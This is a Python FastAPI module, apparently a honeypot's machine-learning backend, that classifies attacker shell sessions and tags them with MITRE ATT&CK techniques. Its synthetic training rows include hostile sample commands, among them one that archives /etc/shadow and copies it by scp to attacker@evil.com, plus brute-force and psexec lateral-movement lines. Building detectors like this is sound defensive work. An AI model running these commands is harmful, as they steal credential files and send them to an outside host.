from fastapi import APIRouter
from pydantic import BaseModel
from typing import List
import pandas as pd
import numpy as np
from sklearn.ensemble import IsolationForest, RandomForestClassifier
from sklearn.pipeline import Pipeline
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.cluster import DBSCAN
import warnings

# Suppress warnings from sklearn
warnings.filterwarnings("ignore")

ml_router = APIRouter()

# --- 1. Synthetic Data Generator ---
def generate_synthetic_data() -> pd.DataFrame:
    # Generates a DataFrame for training the pipelines
    data = [
        {"commands": "ls cd pwd echo hello", "cmd_freq": 10, "duration": 120, "unique_cmds": 4, "ip_score": 85, "rpm": 5, "label": "NORMAL"},
        {"commands": "whoami uname -a ifconfig id ip a arp -a", "cmd_freq": 40, "duration": 30, "unique_cmds": 6, "ip_score": 40, "rpm": 80, "label": "PORT_SCAN"},
        {"commands": "hydra nmap ssh admin@192.168.1.1 -p 22", "cmd_freq": 60, "duration": 50, "unique_cmds": 4, "ip_score": 20, "rpm": 120, "label": "SSH_BRUTEFORCE"},
        {"commands": "tar -czvf backup.tar.gz /etc/shadow scp backup.tar.gz attacker@evil.com:/", "cmd_freq": 15, "duration": 200, "unique_cmds": 3, "ip_score": 50, "rpm": 10, "label": "DATA_EXFIL"},
        {"commands": "netstat -ano ping 10.0.0.5 ssh root@10.0.0.5 psexec \\\\10.0.0.5 cmd.exe", "cmd_freq": 25, "duration": 300, "unique_cmds": 5, "ip_score": 60, "rpm": 20, "label": "LATERAL_MOVEMENT"},
        {"commands": "cat /etc/passwd touch test.txt", "cmd_freq": 5, "duration": 10, "unique_cmds": 2, "ip_score": 90, "rpm": 30, "label": "NORMAL"}
    ]
    return pd.DataFrame(data)

df = generate_synthetic_data()

# --- 2. Anomaly Detection (Isolation Forest) ---
# Train on numeric features of normal data
numeric_features = ["cmd_freq", "duration", "unique_cmds", "ip_score", "rpm"]
normal_df = df[df["label"] == "NORMAL"][numeric_features]
iso_forest = IsolationForest(contamination=0.1, random_state=42)
if not normal_df.empty:
    iso_forest.fit(normal_df)

# --- 3. Threat Classifier (sklearn pipeline) ---
classifier_pipeline = Pipeline([
    ('tfidf', TfidfVectorizer()),
    ('clf', RandomForestClassifier(random_state=42, n_estimators=50))
])
classifier_pipeline.fit(df["commands"], df["label"])

# --- 4. Behavioral Clustering (DBSCAN + TF-IDF) ---
vectorizer = TfidfVectorizer()
X_cluster = vectorizer.fit_transform(df["commands"])
dbscan = DBSCAN(eps=0.5, min_samples=2)
# We fit DBSCAN for the synthetic dataset
dbscan.fit(X_cluster)

# --- 5. Psychological Profiler Lookup ---
def get_psych_profile(threat_label: str, cluster_id: int) -> str:
    if threat_label in ["SSH_BRUTEFORCE", "PORT_SCAN"]:
        return "Automated Bot"
    elif threat_label == "DATA_EXFIL":
        return "Insider Threat"
    elif threat_label == "LATERAL_MOVEMENT":
        return "APT Actor"
    elif threat_label == "UNKNOWN" or cluster_id == -1:
        return "Script Kiddie"
    return "Neutral Observer"

# --- 6. MITRE ATT&CK Mapper ---
MITRE_MAP = {
    "SSH_BRUTEFORCE": {"id": "T1110", "name": "Brute Force", "tactic": "Credential Access"},
    "PORT_SCAN": {"id": "T1046", "name": "Network Service Discovery", "tactic": "Discovery"},
    "DATA_EXFIL": {"id": "T1048", "name": "Exfiltration Over Protocol", "tactic": "Exfiltration"},
    "LATERAL_MOVEMENT": {"id": "T1021", "name": "Remote Services", "tactic": "Lateral Movement"},
    "NORMAL": {"id": "N/A", "name": "Benign Expected Traffic", "tactic": "None"},
    "UNKNOWN": {"id": "T1059", "name": "Command and Scripting Interpreter", "tactic": "Execution"}
}

# --- Request Models ---
class SessionFeatures(BaseModel):
    command_list: List[str]
    cmd_freq: float
    duration: float
    unique_cmds: int
    ip_score: float
    rpm: float

class UnifiedMLResponse(BaseModel):
    anomaly_score: float
    is_anomaly: bool
    threat_label: str
    confidence: float
    cluster_id: int
    psych_profile: str
    mitre_tag: dict

# --- Endpoints ---
@ml_router.post("/api/ml/analyze-session", response_model=UnifiedMLResponse)
def analyze_session(features: SessionFeatures):
    commands_str = " ".join(features.command_list) if features.command_list else "ls"
    
    # 1. Anomaly Detection
    X_num = pd.DataFrame([{
        "cmd_freq": features.cmd_freq,
        "duration": features.duration,
        "unique_cmds": features.unique_cmds,
        "ip_score": features.ip_score,
        "rpm": features.rpm
    }])
    
    # Check if iso_forest is fitted or not (if not enough normal data just fallback)
    try:
        anomaly_pred = iso_forest.predict(X_num)[0] # 1 for normal, -1 for anomaly
        score_raw = iso_forest.decision_function(X_num)[0]
        # Map score to 0-100 anomaly percentage
        anomaly_score = float(max(0, min(100, (0.5 - score_raw) * 100)))
        is_anomaly = (anomaly_pred == -1)
    except Exception:
        anomaly_score = 0.0
        is_anomaly = False

    # 2. Threat Classifier
    try:
        probs = classifier_pipeline.predict_proba([commands_str])[0]
        pred_idx = np.argmax(probs)
        threat_label = classifier_pipeline.classes_[pred_idx]
        confidence = float(probs[pred_idx] * 100)
    except Exception:
        threat_label = "UNKNOWN"
        confidence = 0.0

    # Fallback to UNKNOWN if low confidence
    if confidence < 35.0:
        threat_label = "UNKNOWN"
        confidence = 100.0 - confidence

    # 3. Clustering
    try:
        X_new = vectorizer.transform([commands_str])
        from sklearn.metrics.pairwise import cosine_similarity
        sims = cosine_similarity(X_new, X_cluster)[0]
        best_match_idx = int(np.argmax(sims))
        if sims[best_match_idx] > 0.4:
            cluster_id = int(dbscan.labels_[best_match_idx])
        else:
            cluster_id = -1 # UNKNOWN_CLUSTER_DETECTED
    except Exception:
        cluster_id = -1

    # 4. Psychological Profiler
    psych_profile = get_psych_profile(threat_label, cluster_id)

    # 5. MITRE Mapping
    mitre_tag = MITRE_MAP.get(threat_label, MITRE_MAP["UNKNOWN"])

    return UnifiedMLResponse(
        anomaly_score=anomaly_score,
        is_anomaly=bool(is_anomaly),
        threat_label=threat_label,
        confidence=confidence,
        cluster_id=cluster_id,
        psych_profile=psych_profile,
        mitre_tag=mitre_tag
    )

@ml_router.post("/api/ml/anomaly")
def just_anomaly(features: SessionFeatures):
    # Exposed separately per requirement if needed
    X_num = pd.DataFrame([{
        "cmd_freq": features.cmd_freq, "duration": features.duration,
        "unique_cmds": features.unique_cmds, "ip_score": features.ip_score, "rpm": features.rpm
    }])
    try:
        anomaly_pred = iso_forest.predict(X_num)[0]
        score_raw = iso_forest.decision_function(X_num)[0]
        anomaly_score = float(max(0, min(100, (0.5 - score_raw) * 100)))
        return {"anomaly_score": anomaly_score, "is_anomaly": bool(anomaly_pred == -1)}
    except:
        return {"anomaly_score": 0.0, "is_anomaly": False}

@ml_router.post("/api/ml/classify")
def just_classify(features: SessionFeatures):
    # Exposed separately per requirement
    commands_str = " ".join(features.command_list) if features.command_list else "ls"
    probs = classifier_pipeline.predict_proba([commands_str])[0]
    pred_idx = np.argmax(probs)
    return {
        "threat_label": classifier_pipeline.classes_[pred_idx],
        "confidence": float(probs[pred_idx] * 100)
    }

@ml_router.post("/api/ml/cluster")
def just_cluster(features: SessionFeatures):
    # Exposed separately per requirement
    commands_str = " ".join(features.command_list) if features.command_list else "ls"
    X_new = vectorizer.transform([commands_str])
    from sklearn.metrics.pairwise import cosine_similarity
    sims = cosine_similarity(X_new, X_cluster)[0]
    best_match_idx = int(np.argmax(sims))
    if sims[best_match_idx] > 0.4:
        cluster_id = int(dbscan.labels_[best_match_idx])
    else:
        cluster_id = -1
    return {
        "cluster_id": cluster_id,
        "unknown_cluster_detected": bool(cluster_id == -1)
    }
